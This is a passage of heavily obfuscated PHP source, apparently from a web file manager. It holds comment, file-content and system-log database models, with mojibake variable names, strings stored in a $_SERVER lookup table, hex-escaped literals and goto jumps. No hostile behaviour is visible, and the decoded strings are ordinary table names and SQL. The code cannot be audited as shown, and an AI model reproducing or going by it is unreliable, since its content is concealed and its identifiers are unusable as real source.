!= $´È…Ëé[$ê¿ëÓäˆ[201]] || $ËÏíÃº[$ê¿ëÓäˆ[581]] != $´È…Ëé[$ê¿ëÓäˆ[581]]) { return !1; } $this->where(array($ê¿ëÓäˆ[1999] => $´È…Ëé[$ê¿ëÓäˆ[1998]]))->setAdd($ê¿ëÓäˆ[2000], 1); } $´È…Ëé[$ê¿ëÓäˆ[2001]] = 0; $´È…Ëé[$ê¿ëÓäˆ[2000]] = 0; $´È…Ëé[$ê¿ëÓäˆ[823]] = 1; return $this->add($´È…Ëé); } public function commentCount($ùø¥±Á¹, $òÀÏó, $­œåõ²È = false) { $Ï×…¦©ß =& $_SERVER[Ò°Ì”İ•]; if (!$ùø¥±Á¹) { return array(); } if (is_string($ùø¥±Á¹) || is_int($ùø¥±Á¹)) { $ùø¥±Á¹ = array($ùø¥±Á¹); } $ÖçöÍ¢ö = array($Ï×…¦©ß[581], $Ï×…¦©ß[2002] => $Ï×…¦©ß[577]); $¬²“Ú³ = array($Ï×…¦©ß[581] => array($Ï×…¦©ß[7], $ùø¥±Á¹), $Ï×…¦©ß[201] => $òÀÏó); if ($­œåõ²È) { $¬²“Ú³[$Ï×…¦©ß[1768]] = $­œåõ²È; } $’ÅïŞ÷ = $this->field($ÖçöÍ¢ö)->where($¬²“Ú³)->group($Ï×…¦©ß[581])->select(); return array_to_keyvalue($’ÅïŞ÷, $Ï×…¦©ß[581], $Ï×…¦©ß[577]); } public function starTarget($èË½²’¥, $Ğ›úŸÊÏ) { $ËÊòİã½ =& $_SERVER[Ò°Ì”İ•]; $ÄÖŞÖ…Õ = $èË½²’¥ + self::TYPE_STAR_OFFSET; $’çßıÀó = array($ËÊòİã½[1768] => USER_ID, $ËÊòİã½[201] => $ÄÖŞÖ…Õ, $ËÊòİã½[581] => $Ğ›úŸÊÏ); $ç¥Ù¸Õø = $this->where($’çßıÀó)->find(); if ($ç¥Ù¸Õø) { return $this->where(array($ËÊòİã½[487] => $ç¥Ù¸Õø[$ËÊòİã½[487]]))->delete(); } $²µğü = array($ËÊòİã½[1998] => 0, $ËÊòİã½[1768] => USER_ID, $ËÊòİã½[823] => 1, $ËÊòİã½[182] => $ËÊòİã½[12], $ËÊòİã½[201] => $ÄÖŞÖ…Õ, $ËÊòİã½[581] => $Ğ›úŸÊÏ, $ËÊòİã½[2001] => 0, $ËÊòİã½[2000] => 0); return $this->add($²µğü); } public function starTargetCount($Ùµõ´Úæ, $ˆÛÉú¡Ÿ) { $£ú¯§ˆ¥ =& $_SERVER[Ò°Ì”İ•]; $–Å§¢ºÈ = $ˆÛÉú¡Ÿ + self::TYPE_STAR_OFFSET; $ŠşúÍ = $this->commentCount($Ùµõ´Úæ, $–Å§¢ºÈ); $¦µ‰¢‡€ = $this->commentCount($Ùµõ´Úæ, $–Å§¢ºÈ, USER_ID); return array($£ú¯§ˆ¥[2003] => $ŠşúÍ, $£ú¯§ˆ¥[2004] => $¦µ‰¢‡€); } public function starTargetUserList($±‹Ä¼—‘, $¡»ü¶¾) { $ˆ˜âµ =& $_SERVER[Ò°Ì”İ•]; $æ£¥æË¶ = $±‹Ä¼—‘ + self::TYPE_STAR_OFFSET; $ı¼àõåĞ = array($ˆ˜âµ[581] => $¡»ü¶¾, $ˆ˜âµ[201] => $æ£¥æË¶); $èÎ —²ƒ = $this->where($ı¼àõåĞ)->count(); $—…çÜŠÑ = array($ˆ˜âµ[344] => $èÎ —²ƒ, $ˆ˜âµ[2005] => array()); if (!$èÎ —²ƒ) { return $—…çÜŠÑ; } $š›‚éší = $this->field($ˆ˜âµ[1768])->where($ı¼àõåĞ)->limit(500)->select(); $š›‚éší = array_to_keyvalue($š›‚éší, $ˆ˜âµ[12], $ˆ˜âµ[1768]); $—…çÜŠÑ[$ˆ˜âµ[2005]] = Model($ˆ˜âµ[589])->userListInfo($š›‚éší); return $—…çÜŠÑ; } public function prasiseUserList($¬óñçê) { $Ñö½ çñ =& $_SERVER[Ò°Ì”İ•]; $Ã©¬¶³™ = array($Ñö½ çñ[2006] => $¬óñçê); $¨Áááãï = $this->where($Ã©¬¶³™)->find(); $å®¹ÎÑÏ = _get($¨Áááãï, $Ñö½ çñ[2001], 0); $©‰´Âã’ = array($Ñö½ çñ[344] => $å®¹ÎÑÏ, $Ñö½ çñ[2005] => array()); if (!$å®¹ÎÑÏ) { return $©‰´Âã’; } $Ÿ…½Ş’ë = Model($Ñö½ çñ[2007])->field($Ñö½ çñ[1768])->where($Ã©¬¶³™)->limit(500)->select(); $Ÿ…½Ş’ë = array_to_keyvalue($Ÿ…½Ş’ë, $Ñö½ çñ[12], $Ñö½ çñ[1768]); $©‰´Âã’[$Ñö½ çñ[2005]] = Model($Ñö½ çñ[589])->userListInfo($Ÿ…½Ş’ë); return $©‰´Âã’; } public function remove($—‹¦—ŒŠ) { $İˆ—¼«Ğ =& $_SERVER[Ò°Ì”İ•]; $‘öÑ´Î = array($İˆ—¼«Ğ[1999] => $—‹¦—ŒŠ); $ğÅ»¶ëÓ = $this->where($‘öÑ´Î)->find(); if ($ğÅ»¶ëÓ[$İˆ—¼«Ğ[1998]]) { $this->where(array($İˆ—¼«Ğ[1999] => $ğÅ»¶ëÓ[$İˆ—¼«Ğ[1998]]))->setAdd($İˆ—¼«Ğ[2000], -1); } return $this->where($‘öÑ´Î)->delete(); } public function edit($½­ß­ˆº, $±Åì¼÷) { $¬”ä¦éÔ =& $_SERVER[Ò°Ì”İ•]; $ö³ùÑõ® = array($¬”ä¦éÔ[1999] => $½­ß­ˆº); return $this->where($ö³ùÑõ®)->save(array($¬”ä¦éÔ[2008] => $±Åì¼÷)); } public function prasise($Âú¯†¿) { $ŸçÑş¡ =& $_SERVER[Ò°Ì”İ•]; $¨³å™Ø® = Model($ŸçÑş¡[2009]); $İıÍ©×é = array($ŸçÑş¡[1999] => $Âú¯†¿, $ŸçÑş¡[1759] => USER_ID); $®ô÷­šå = $¨³å™Ø®->where($İıÍ©×é)->find(); if (!$®ô÷­šå) { $¨³å™Ø®->add($İıÍ©×é); $¨£Í§æû = $this->where(array($ŸçÑş¡[1999] => $Âú¯†¿))->setAdd($ŸçÑş¡[2001], 1); } else { $¨³å™Ø®->where($İıÍ©×é)->delete(); $¨£Í§æû = $this->where(array($ŸçÑş¡[1999] => $Âú¯†¿))->setAdd($ŸçÑş¡[2001], -1); } return $¨£Í§æû; } public function targetInfo($ÛµÌµ¤î, $Ğ‘°İ) { $™ÒáãÎ¸ =& $_SERVER[Ò°Ì”İ•]; $ŞîÖéÌ = array($™ÒáãÎ¸[663] => $ÛµÌµ¤î, $™ÒáãÎ¸[664] => $Ğ‘°İ); $İÓºÉÇµ = $this->where($ŞîÖéÌ)->count(); $”ø¬É­ = "\x52\111\x47\x48\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\x63\157\x6d\155\x65\156\x74\x5f\160\x72\x61\x69\x73\145\x20\x73\164\x61\162\x20\x6f\x6e\x20\x63\157\155\155\145\156\x74\56\143\157\x6d\155\145\156\164\x49\x44\40\75\x20\x73\x74\141\162\x2e\x63\x6f\x6d\x6d\145\156\164\x49\x44"; $¶¬ë„¤¦ = $this->alias($™ÒáãÎ¸[441])->where($ŞîÖéÌ)->join($”ø¬É­, $™ÒáãÎ¸[2010])->count(); $Éû«óœ = array($™ÒáãÎ¸[2011] => $İÓºÉÇµ, $™ÒáãÎ¸[2012] => $¶¬ë„¤¦); return $Éû«óœ; } public function listData($Æá¤Ğâ×) { $ƒìıãÜ =& $_SERVER[Ò°Ì”İ•]; if (isset($Æá¤Ğâ×[$ƒìıãÜ[2013]])) { if ($Æá¤Ğâ×[$ƒìıãÜ[2013]]) { $Æá¤Ğâ×[$ƒìıãÜ[2006]] = array($ƒìıãÜ[1087], intval($Æá¤Ğâ×[$ƒìıãÜ[2013]])); } unset($Æá¤Ğâ×[$ƒìıãÜ[2013]]); } if (isset($Æá¤Ğâ×[$ƒìıãÜ[2014]])) { if ($Æá¤Ğâ×[$ƒìıãÜ[2014]]) { $Æá¤Ğâ×[$ƒìıãÜ[2006]] = array($ƒìıãÜ[1084], intval($Æá¤Ğâ×[$ƒìıãÜ[2014]])); } unset($Æá¤Ğâ×[$ƒìıãÜ[2014]]); } return $this->_listData($Æá¤Ğâ×); } private function _listData($†’Â«—ª) { $Ê±°Œ¶Ø =& $_SERVER[Ò°Ì”İ•]; $Ï¦ğßê” = $this->where($†’Â«—ª)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ï¦ğßê”[$Ê±°Œ¶Ø[457]]); $this->_listAppendUser($Ï¦ğßê”[$Ê±°Œ¶Ø[457]]); $this->_listAppendMeta($Ï¦ğßê”[$Ê±°Œ¶Ø[457]]); return $Ï¦ğßê”; } private function _makeOrder() { $™ƒ§ä† =& $_SERVER[Ò°Ì”İ•]; $ÓçÂš¶Ú = array($™ƒ§ä†[2001], $™ƒ§ä†[2000], $™ƒ§ä†[244]); $ÄÀõõ‹» = Input::get($™ƒ§ä†[542], $™ƒ§ä†[7], $™ƒ§ä†[509], $ÓçÂš¶Ú); $ø¤øÊÇ = Input::get($™ƒ§ä†[543], $™ƒ§ä†[7], $™ƒ§ä†[1761], array($™ƒ§ä†[2015], $™ƒ§ä†[538])); $ß¶é‘ôÂ = $ÄÀõõ‹» . $™ƒ§ä†[53] . $ø¤øÊÇ; return $this->order($ß¶é‘ôÂ); } private function _listAppendParent(&$°ì”Ì–Ã) { $£¶™À =& $_SERVER[Ò°Ì”İ•]; $ïı‚¿À¯ = array_unique(array_to_keyvalue($°ì”Ì–Ã, $£¶™À[12], $£¶™À[1998])); $ïı‚¿À¯ = array_remove_value($ïı‚¿À¯, $£¶™À[241]); if (!$ïı‚¿À¯) { return; } $Ä×…óüÙ = $this->where(array($£¶™À[1999] => array($£¶™À[7], $ïı‚¿À¯)))->select(); $Ä×…óüÙ = array_to_keyvalue($Ä×…óüÙ, $£¶™À[2006]); foreach ($°ì”Ì–Ã as &$‘¬™°Ğ½) { if (isset($Ä×…óüÙ[$‘¬™°Ğ½[$£¶™À[1998]]])) { $‘¬™°Ğ½[$£¶™À[2016]] = $Ä×…óüÙ[$‘¬™°Ğ½[$£¶™À[1998]]]; } } unset($‘¬™°Ğ½); } private function _listAppendUser(&$›ëµ×ë–) { $éñî‹µ– =& $_SERVER[Ò°Ì”İ•]; $Ï“ÛŒ‡ = array_unique(array_to_keyvalue($›ëµ×ë–, $éñî‹µ–[12], $éñî‹µ–[1768])); $Ï“ÛŒ‡ = array_remove_value($Ï“ÛŒ‡, $éñî‹µ–[241]); if (count($Ï“ÛŒ‡) == 0) { return; } foreach ($›ëµ×ë– as $ğ×”º…¡) { if (isset($ğ×”º…¡[$éñî‹µ–[2016]])) { $Ï“ÛŒ‡[] = $ğ×”º…¡[$éñî‹µ–[2016]][$éñî‹µ–[1768]]; } } $öèµÏ«• = Model($éñî‹µ–[609])->userListInfo($Ï“ÛŒ‡); foreach ($›ëµ×ë– as &$ğ×”º…¡) { $ğ×”º…¡[$éñî‹µ–[677]] = $öèµÏ«•[$ğ×”º…¡[$éñî‹µ–[1768]]]; if (isset($ğ×”º…¡[$éñî‹µ–[2016]])) { $ğ×”º…¡[$éñî‹µ–[2016]][$éñî‹µ–[677]] = $öèµÏ«•[$ğ×”º…¡[$éñî‹µ–[2016]][$éñî‹µ–[1768]]]; } } unset($ğ×”º…¡); } private function _listAppendMeta(&$Â—ïÕÛ) { $Õ¢çŒº° =& $_SERVER[Ò°Ì”İ•]; $¬Á€ùÀ‚ = array_unique(array_to_keyvalue($Â—ïÕÛ, $Õ¢çŒº°[12], $Õ¢çŒº°[2006])); $¬Á€ùÀ‚ = array_remove_value($¬Á€ùÀ‚, $Õ¢çŒº°[241]); if (!$¬Á€ùÀ‚) { return; } foreach ($Â—ïÕÛ as $°òş•) { if (isset($°òş•[$Õ¢çŒº°[2016]])) { $¬Á€ùÀ‚[] = $°òş•[$Õ¢çŒº°[2016]][$Õ¢çŒº°[2006]]; } } $¨Ç„¼‘ñ = $this->metaList($¬Á€ùÀ‚); if (!$¨Ç„¼‘ñ) { return !1; } foreach ($Â—ïÕÛ as &$°òş•) { $°òş•[$Õ¢çŒº°[551]] = $¨Ç„¼‘ñ[$°òş•[$Õ¢çŒº°[2006]]]; if (isset($°òş•[$Õ¢çŒº°[2016]])) { $°òş•[$Õ¢çŒº°[2016]][$Õ¢çŒº°[551]] = $¨Ç„¼‘ñ[$°òş•[$Õ¢çŒº°[2016]][$Õ¢çŒº°[2006]]]; } } unset($°òş•); } private function metaList($á½ê¼ÌÁ) { $Ï‘€·Ç =& $_SERVER[Ò°Ì”İ•]; if (!$á½ê¼ÌÁ) { return array(); } $©½úÕƒû = array($Ï‘€·Ç[2006] => array($Ï‘€·Ç[7], $á½ê¼ÌÁ)); $„ë›Ôı¤ = Model($Ï‘€·Ç[2017])->where($©½úÕƒû)->select(); $„ë›Ôı¤ = array_to_keyvalue_group($„ë›Ôı¤, $Ï‘€·Ç[2006]); foreach ($„ë›Ôı¤ as $ÌÜÖ— => $ÓÑÁæ˜¾) { $êò™±©ê = array(); foreach ($ÓÑÁæ˜¾ as $‰¡Ïó„) { $êò™±©ê[$‰¡Ïó„[$Ï‘€·Ç[108]]] = $‰¡Ïó„[$Ï‘€·Ç[462]]; } $„ë›Ôı¤[$ÌÜÖ—] = $êò™±©ê; } return $„ë›Ôı¤ ? $„ë›Ôı¤ : array(); } public function removeTarget($¾Şƒ«ò, $»‹­ØÖ—) { $‰µÜöŠ„ =& $_SERVER[Ò°Ì”İ•]; if (!$»‹­ØÖ—) { return !0; } $»‹­ØÖ— = is_array($»‹­ØÖ—) ? $»‹­ØÖ— : array($»‹­ØÖ—); $¶ÇèüŒ = array($‰µÜöŠ„[201] => $¾Şƒ«ò, $‰µÜöŠ„[581] => array($‰µÜöŠ„[7], $»‹­ØÖ—)); $üêÌ†º = $this->field($‰µÜöŠ„[2006])->where($¶ÇèüŒ)->select(); $½ëÅîá› = array_to_keyvalue($üêÌ†º, $‰µÜöŠ„[12], $‰µÜöŠ„[2006]); if (!$½ëÅîá›) { return !0; } $¶ÇèüŒ = array($‰µÜöŠ„[2006] => array($‰µÜöŠ„[7], $½ëÅîá›)); $this->where($¶ÇèüŒ)->delete(); Model($‰µÜöŠ„[2009])->where($¶ÇèüŒ)->delete(); Model($‰µÜöŠ„[2018])->where($¶ÇèüŒ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\x6c\145\137\x63\x6f\156\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\x54\151\x6d\145", "\164\151\155\145", "\151\x6e\x73\145\x72\164", "\146\165\156\143\x74\151\x6f\156")); } goto EİàØ¹½£Ò; cºµÀ¥• ™: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\x74", "\146\165\x6e\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¡ı»â–Ó =& $_SERVER[Ò°Ì”İ•]; return array($¡ı»â–Ó[2338] => LNG($¡ı»â–Ó[2339]), $¡ı»â–Ó[2340] => LNG($¡ı»â–Ó[2341]), $¡ı»â–Ó[1911] => LNG($¡ı»â–Ó[2342]), $¡ı»â–Ó[2343] => LNG($¡ı»â–Ó[2344]), $¡ı»â–Ó[2345] => LNG($¡ı»â–Ó[2346]), $¡ı»â–Ó[2347] => LNG($¡ı»â–Ó[2348]), $¡ı»â–Ó[2349] => LNG($¡ı»â–Ó[2350]), $¡ı»â–Ó[1941] => LNG($¡ı»â–Ó[2350]), $¡ı»â–Ó[1942] => LNG($¡ı»â–Ó[2351]), $¡ı»â–Ó[2352] => LNG($¡ı»â–Ó[2353]), $¡ı»â–Ó[2354] => LNG($¡ı»â–Ó[2355]), $¡ı»â–Ó[2356] => LNG($¡ı»â–Ó[2357]), $¡ı»â–Ó[2358] => LNG($¡ı»â–Ó[2359]), $¡ı»â–Ó[1939] => LNG($¡ı»â–Ó[2360]), $¡ı»â–Ó[2361] => LNG($¡ı»â–Ó[2362]), $¡ı»â–Ó[1946] => LNG($¡ı»â–Ó[2363]), $¡ı»â–Ó[2364] => LNG($¡ı»â–Ó[2365]), $¡ı»â–Ó[2366] => LNG($¡ı»â–Ó[2367]), $¡ı»â–Ó[2368] => LNG($¡ı»â–Ó[2369]), $¡ı»â–Ó[2370] => LNG($¡ı»â–Ó[2371]), $¡ı»â–Ó[1949] => LNG($¡ı»â–Ó[2372]), $¡ı»â–Ó[1950] => LNG($¡ı»â–Ó[2373]), $¡ı»â–Ó[2374] => LNG($¡ı»â–Ó[2375]), $¡ı»â–Ó[2376] => LNG($¡ı»â–Ó[2377]), $¡ı»â–Ó[2378] => LNG($¡ı»â–Ó[2379]), $¡ı»â–Ó[1944] => LNG($¡ı»â–Ó[2380]), $¡ı»â–Ó[2381] => LNG($¡ı»â–Ó[2382]), $¡ı»â–Ó[1943] => LNG($¡ı»â–Ó[2383]), $¡ı»â–Ó[2384] => LNG($¡ı»â–Ó[2385]), $¡ı»â–Ó[2386] => LNG($¡ı»â–Ó[2387]), $¡ı»â–Ó[2388] => LNG($¡ı»â–Ó[2387]), $¡ı»â–Ó[2389] => LNG($¡ı»â–Ó[2390]), $¡ı»â–Ó[2391] => LNG($¡ı»â–Ó[2391]), $¡ı»â–Ó[2392] => LNG($¡ı»â–Ó[1915]), $¡ı»â–Ó[2393] => LNG($¡ı»â–Ó[2394]), $¡ı»â–Ó[2395] => LNG($¡ı»â–Ó[2396]), $¡ı»â–Ó[2397] => LNG($¡ı»â–Ó[2398]), $¡ı»â–Ó[2399] => LNG($¡ı»â–Ó[2400]), $¡ı»â–Ó[2401] => LNG($¡ı»â–Ó[2402]), $¡ı»â–Ó[2403] => LNG($¡ı»â–Ó[2403]), $¡ı»â–Ó[2404] => LNG($¡ı»â–Ó[2405]), $¡ı»â–Ó[2406] => LNG($¡ı»â–Ó[2407]), $¡ı»â–Ó[2408] => LNG($¡ı»â–Ó[2409]), $¡ı»â–Ó[2410] => LNG($¡ı»â–Ó[2411]), $¡ı»â–Ó[2412] => LNG($¡ı»â–Ó[2413]), $¡ı»â–Ó[2414] => LNG($¡ı»â–Ó[2415]), $¡ı»â–Ó[223] => LNG($¡ı»â–Ó[223]), $¡ı»â–Ó[224] => LNG($¡ı»â–Ó[2416]), $¡ı»â–Ó[2417] => LNG($¡ı»â–Ó[2417])); } private function typeFile() { $³æƒãœ‘ =& $_SERVER[Ò°Ì”İ•]; $÷ç­Í‡Æ = array($³æƒãœ‘[1946] => array($³æƒãœ‘[1947]), $³æƒãœ‘[2356] => array($³æƒãœ‘[2418]), $³æƒãœ‘[2358] => array($³æƒãœ‘[2419]), $³æƒãœ‘[1939] => array($³æƒãœ‘[1940], $³æƒãœ‘[2420]), $³æƒãœ‘[2366] => array(), $³æƒãœ‘[2368] => array(), $³æƒãœ‘[2370] => array(), $³æƒãœ‘[1949] => array($³æƒãœ‘[1951]), $³æƒãœ‘[1950] => array($³æƒãœ‘[1951]), $³æƒãœ‘[2374] => array($³æƒãœ‘[2421]), $³æƒãœ‘[2376] => array($³æƒãœ‘[2421]), $³æƒãœ‘[2378] => array($³æƒãœ‘[2422]), $³æƒãœ‘[2364] => array($³æƒãœ‘[2423]), $³æƒãœ‘[1944] => array($³æƒãœ‘[2424]), $³æƒãœ‘[2381] => array($³æƒãœ‘[2425]), $³æƒãœ‘[1943] => array($³æƒãœ‘[1945])); return $÷ç­Í‡Æ; } private function typeAll() { $ğ•Ïà‡ =& $_SERVER[Ò°Ì”İ•]; $ë¶óİªâ = $this->typeList; $ÓÓ‰“ÆÅ = array_filter($this->typeFile()); foreach ($ÓÓ‰“ÆÅ as $ßŒè¶úï => $ü«¿·­³) { $ë¶óİªâ[$ü«¿·­³[0]] = $ë¶óİªâ[$ßŒè¶úï]; } $ë¶óİªâ[$ğ•Ïà‡[1951]] = LNG($ğ•Ïà‡[2426]); $ë¶óİªâ[$ğ•Ïà‡[2421]] = LNG($ğ•Ïà‡[2427]); return $ë¶óİªâ; } public function addLog($‹ñœ‹, $ù£˜¶ê = array()) { $ÎÊã”Ü• =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->typeList[$‹ñœ‹])) { return; } $Ì‰Àº©á = Session::get($ÎÊã”Ü•[2110]); if (!$Ì‰Àº©á) { $Ì‰Àº©á = _get($ù£˜¶ê, $ÎÊã”Ü•[1768], 0); } if ($‹ñœ‹ == $ÎÊã”Ü•[2393] && is_array($ù£˜¶ê[$ÎÊã”Ü•[2428]]) && !$ù£˜¶ê[$ÎÊã”Ü•[2428]]) { return; } $îÕõ¿½ = get_client_ip(); if (!$ù£˜¶ê || strlen(json_encode($ù£˜¶ê)) >= 1024 * 64) { if ($ù£˜¶ê && is_array($ù£˜¶ê)) { $ù£˜¶ê = array_intersect_key($ù£˜¶ê, array_flip($ÎÊã”Ü•[487], $ÎÊã”Ü•[32])); $ù£˜¶ê[$ÎÊã”Ü•[2429]] = $îÕõ¿½; } else { $ù£˜¶ê = array($ÎÊã”Ü•[2429] => $îÕõ¿½); } } else { if (is_array($ù£˜¶ê)) { $ù£˜¶ê[$ÎÊã”Ü•[2429]] = $îÕõ¿½; } else { $ù£˜¶ê = array($ÎÊã”Ü•[1283] => $ù£˜¶ê, $ÎÊã”Ü•[2429] => $îÕõ¿½); } } $ù£˜¶ê = array($ÎÊã”Ü•[1758] => Session::sign(), $ÎÊã”Ü•[1759] => intval($Ì‰Àº©á), $ÎÊã”Ü•[33] => $‹ñœ‹, $ÎÊã”Ü•[1761] => json_encode($ù£˜¶ê)); return parent::add($ù£˜¶ê); } public function remove($ÑâØò†) { $this->where(array($_SERVER[Ò°Ì”İ•][505] => $ÑâØò†))->delete(); } private function _makeOrder($ñÍÂÃŠï = '') { $†Øµ†µ =& $_SERVER[Ò°Ì”İ•]; $óÃŒ¢¨î = $†Øµ†µ[244]; $¡àÌ¼” = array($†Øµ†µ[535] => $†Øµ†µ[536], $†Øµ†µ[537] => $†Øµ†µ[538]); $€øúÊÍÄ = Input::get($†Øµ†µ[543], $†Øµ†µ[7], $†Øµ†µ[2147], array($†Øµ†µ[2064], $†Øµ†µ[537])); $€øúÊÍÄ = $¡àÌ¼”[$€øúÊÍÄ]; $ñÍÂÃŠï = $ñÍÂÃŠï . "{$óÃŒ¢¨î}\x20{$€øúÊÍÄ}"; return $this->order($ñÍÂÃŠï); } public function get($ÙƒæÁË = '') { $Œˆ¹éà =& $_SERVER[Ò°Ì”İ•]; if (!$ÙƒæÁË) { show_json(array()); } $ı‡‰ä¡ø = array(); if ($ÙƒæÁË[$Œˆ¹éà[1768]]) { $ı‡‰ä¡ø[$Œˆ¹éà[1768]] = $ÙƒæÁË[$Œˆ¹éà[1768]]; } if (isset($ÙƒæÁË[$Œˆ¹éà[833]])) { $š¹®€¢é = $ÙƒæÁË[$Œˆ¹éà[833]]; $»ê÷õ†Ã = isset($ÙƒæÁË[$Œˆ¹éà[834]]) ? $ÙƒæÁË[$Œˆ¹éà[834]] : time(); $ı‡‰ä¡ø[$Œˆ¹éà[244]] = array($Œˆ¹éà[420], array($š¹®€¢é, $»ê÷õ†Ã)); } if ($ÙƒæÁË[$Œˆ¹éà[33]]) { $µ¿¹úŒÖ = explode($Œˆ¹éà[50], $ÙƒæÁË[$Œˆ¹éà[33]]); $óÙãËÅ = $this->typeFile(); $®ÛîÜ™Ï = array(); foreach ($µ¿¹úŒÖ as $ÏÉıçç) { $®ÛîÜ™Ï[] = $ÏÉıçç; if (isset($óÙãËÅ[$ÏÉıçç])) { $®ÛîÜ™Ï = array_merge($®ÛîÜ™Ï, $óÙãËÅ[$ÏÉıçç]); } } $®ÛîÜ™Ï = array_unique($®ÛîÜ™Ï); if ($®ÛîÜ™Ï) { $ı‡‰ä¡ø[$Œˆ¹éà[33]] = array($Œˆ¹éà[7], $®ÛîÜ™Ï); } } else { $ı‡‰ä¡ø[$Œˆ¹éà[33]] = array($Œˆ¹éà[2430], $Œˆ¹éà[2431]); } if (!empty($ÙƒæÁË[$Œˆ¹éà[2429]])) { $ı‡‰ä¡ø[$Œˆ¹éà[538]] = array($Œˆ¹éà[471], "\45{$ÙƒæÁË[$Œˆ¹éà[2429]]}\x25"); } $œºŒ”Æ€ = $this->_makeOrder()->where($ı‡‰ä¡ø)->selectPage(); if (empty($œºŒ”Æ€[$Œˆ¹éà[457]])) { show_json(array(), !0, $œºŒ”Æ€[$Œˆ¹éà[454]]); } $œºŒ”Æ€[$Œˆ¹éà[457]] = $this->logList($œºŒ”Æ€[$Œˆ¹éà[457]]); return $œºŒ”Æ€; } private function ipAddress(&$À¨òÙŞ£) { $¯”áƒ‘ =& $_SERVER[Ò°Ì”İ•]; if (!empty($À¨òÙŞ£[$¯”áƒ‘[2429]])) { $å½Šæñ‡ = IpLocation::get($À¨òÙŞ£[$¯”áƒ‘[2429]]); } else { $å½Šæñ‡ = LNG($¯”áƒ‘[2432]); } $À¨òÙŞ£[$¯”áƒ‘[2433]] = $å½Šæñ‡; } private function descZipDownload($ïò®ú» , &$à²§²ŸÉ) { $°øÛ¬ö =& $_SERVER[Ò°Ì”İ•]; if (!isset($ïò®ú» [$°øÛ¬ö[2434]])) { return; } $ê×¹’ÇÕ = json_decode($ïò®ú» [$°øÛ¬ö[2434]], !0); foreach ($ê×¹’ÇÕ as $ÓÇê´»›) { try { $Ú«³¶‹Õ = IO::infoFullSimple($ÓÇê´»›[$°øÛ¬ö[98]]); } catch (Exception $Ïì×Ï¾’) { continue; } $ïò®ú» [$°øÛ¬ö[98]] = $ÓÇê´»›[$°øÛ¬ö[98]]; $à²§²ŸÉ[] = $ïò®ú» [$°øÛ¬ö[204]] = $Ú«³¶‹Õ[$°øÛ¬ö[204]]; $à²§²ŸÉ[] = $ïò®ú» [$°øÛ¬ö[2203]] = $Ú«³¶‹Õ[$°øÛ¬ö[203]]; break; } return $ïò®ú» ; } private function getSourceList(&$¿Êª¡ã) { $àÊßË¾Š =& $_SERVER[Ò°Ì”İ•]; $§¡äÆÛ† = array(); foreach ($¿Êª¡ã as $“âĞí§° => $‹úÜ•÷›) { $øáÍ¤ö = json_decode($‹úÜ•÷›[$àÊßË¾Š[538]], !0); if ($‹úÜ•÷›[$àÊßË¾Š[33]] == $àÊßË¾Š[1942]) { $øáÍ¤ö = $this->descZipDownload($øáÍ¤ö, $§¡äÆÛ†); $¿Êª¡ã[$“âĞí§°][$àÊßË¾Š[538]] = json_encode($øáÍ¤ö); continue; } if (strpos($‹úÜ•÷›[$àÊßË¾Š[33]], $àÊßË¾Š[2205]) !== 0) { if (!isset($øáÍ¤ö[$àÊßË¾Š[98]]) || strpos($‹úÜ•÷›[$àÊßË¾Š[33]], $àÊßË¾Š[2435]) !== 0) { continue; } try { $Ü§øÛçŒ = IO::infoFullSimple($øáÍ¤ö[$àÊßË¾Š[98]]); } catch (Exception $Ÿ½á™ÎÁ) { continue; } $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[204]] = $Ü§øÛçŒ[$àÊßË¾Š[204]]; $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[2203]] = $Ü§øÛçŒ[$àÊßË¾Š[203]]; $¿Êª¡ã[$“âĞí§°][$àÊßË¾Š[538]] = json_encode($øáÍ¤ö); continue; } $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[204]]; $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[2203]]; if ($øáÍ¤ö[$àÊßË¾Š[33]] == $àÊßË¾Š[635]) { $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[538]][$àÊßË¾Š[1237]]; $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[538]][$àÊßË¾Š[1238]]; } if ($øáÍ¤ö[$àÊßË¾Š[33]] == $àÊßË¾Š[2214]) { $§¡äÆÛ†[] = $øáÍ¤ö[$àÊßË¾Š[538]][$àÊßË¾Š[204]]; } } if (!$§¡äÆÛ†) { return array(); } return Model($àÊßË¾Š[898])->sourceListInfo($§¡äÆÛ†, !0); } private function logList($öğüò) { $²ï·ö—¦ =& $_SERVER[Ò°Ì”İ•]; $…°Å¤± = array_to_keyvalue($öğüò, $²ï·ö—¦[12], $²ï·ö—¦[1768]); $¢æåŞû¡ = Model($²ï·ö—¦[609])->userListInfo(array_unique($…°Å¤±)); $˜‰±Âêû = $this->getSourceList($öğüò); $×íûó¸ª = $this->typeAll(); $Ñ™Ì£ñ‡ = array(); $Î£„–‹ = array(); foreach ($öğüò as $Ïú²¥Ò => $ûÇÏìñ§) { $Ÿë˜ôÁó = $ûÇÏìñ§[$²ï·ö—¦[33]]; $¯™Äë“ = isset($¢æåŞû¡[$ûÇÏìñ§[$²ï·ö—¦[1768]]]) ? $¢æåŞû¡[$ûÇÏìñ§[$²ï·ö—¦[1768]]] : !1; $ıïç®ò® = strpos($Ÿë˜ôÁó, $²ï·ö—¦[2436]) === 0 ? LNG($²ï·ö—¦[2437]) : LNG($²ï·ö—¦[2432]); $ûÇÏìñ§[$²ï·ö—¦[32]] = isset($¯™Äë“[$²ï·ö—¦[32]]) ? $¯™Äë“[$²ï·ö—¦[32]] : LNG($²ï·ö—¦[2432]); $ûÇÏìñ§[$²ï·ö—¦[2264]] = isset($¯™Äë“[$²ï·ö—¦[2264]]) ? $¯™Äë“[$²ï·ö—¦[2264]] : $²ï·ö—¦[12]; $ûÇÏìñ§[$²ï·ö—¦[1656]] = 